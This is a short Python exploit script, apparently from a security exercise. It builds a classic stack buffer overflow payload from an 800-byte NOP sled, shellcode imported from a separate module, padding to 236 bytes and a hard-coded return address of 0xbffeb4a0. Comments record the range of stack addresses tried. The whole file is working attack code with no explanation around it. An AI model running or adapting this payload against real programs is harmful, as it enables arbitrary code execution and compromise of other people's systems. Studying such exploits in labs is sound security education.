from struct import pack
from shellcode import shellcode

offset = "\x90" * 800
takeoff = pack("<I", 0xbffeb4a0);
# lowest:  0xbffeb8dc or 0xbffeb380
# highest: 0xbffeb4a0 
print(offset + shellcode + ("\x90" * (236-len(shellcode))) + takeoff)
